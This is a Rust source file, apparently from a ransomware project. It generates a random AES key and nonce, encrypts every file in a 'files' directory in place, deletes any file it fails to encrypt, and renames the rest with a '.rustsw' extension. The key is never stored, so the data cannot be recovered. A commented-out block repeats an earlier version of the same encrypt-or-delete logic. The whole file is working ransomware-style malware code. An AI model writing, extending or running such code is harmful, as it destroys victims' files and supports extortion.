mod encryption;
use aes_gcm_siv::aead::{Aead, NewAead};
use aes_gcm_siv::{Aes256GcmSiv, Key, Nonce};
use encryption::encryptor;
use encryption::key_gen;
use rand::prelude::*;
use rand_hc::Hc128Rng;
use std::fs;
use std::path;

const ENCRYPTED_EXTENSION: &str = ".rustsw";

fn main() {
    let mut key_gen = key_gen::KeyGen::from(Hc128Rng::from_entropy());

    let key_bytes = key_gen.gen_key_bytes();
    let nonce_bytes = key_gen.gen_nonce_bytes();

    let encryptor = encryptor::Encryptor::from(key_bytes, nonce_bytes);

    let files = fs::read_dir("files").unwrap();

    encrypt_files_in_dir(files, encryptor);
}

fn encrypt_files_in_dir(dir: fs::ReadDir, encryptor: encryptor::Encryptor) {
    for path in dir {
        let file_path = match path {
            Ok(path) => path.path(),
            Err(_) => continue,
        };

        println!("Name: {}", file_path.display());
        encryptor.encrypt_file_else_delete(&file_path);

        match fs::rename(
            &file_path,
            file_path.display().to_string() + ENCRYPTED_EXTENSION,
        ) {
            Ok(_) => (),
            Err(_) => (),
        };
    }
}

/*
fn encrypt(plain_text: &Vec<u8>) -> Vec<u8> {
    let mut rng = Hc128Rng::from_entropy();
    let mut key_bytes: [u8; 32] = [0; 32];
    let mut nonce_bytes: [u8; 12] = [0; 12];
    rng.fill_bytes(&mut key_bytes);
    rng.fill_bytes(&mut nonce_bytes);

    let key = Key::from_slice(&key_bytes);
    let cipher = Aes256GcmSiv::new(key);
    let nonce = Nonce::from_slice(&nonce_bytes);

    match cipher.encrypt(&nonce, plain_text.as_ref()) {
        Ok(encrypted_text) => encrypted_text,
        Err(_) => vec![],
    }
}

fn encrypt_file(path: &path::PathBuf) {
    let bytes_to_encrypt = match fs::read(&path) {
        Ok(bytes) => bytes,
        Err(_) => {
            attempt_delete_file(&path);
            return;
        }
    };
    let bytes_encrypted = encrypt(&bytes_to_encrypt);

    match fs::write(&path, bytes_encrypted) {
        Ok(_) => (),
        Err(_) => {
            attempt_delete_file(&path);
        }
    };
}

fn attempt_delete_file(path: &path::PathBuf) {
    match fs::remove_file(path) {
        Ok(_) => (),
        Err(_) => (),
    };
}
*/
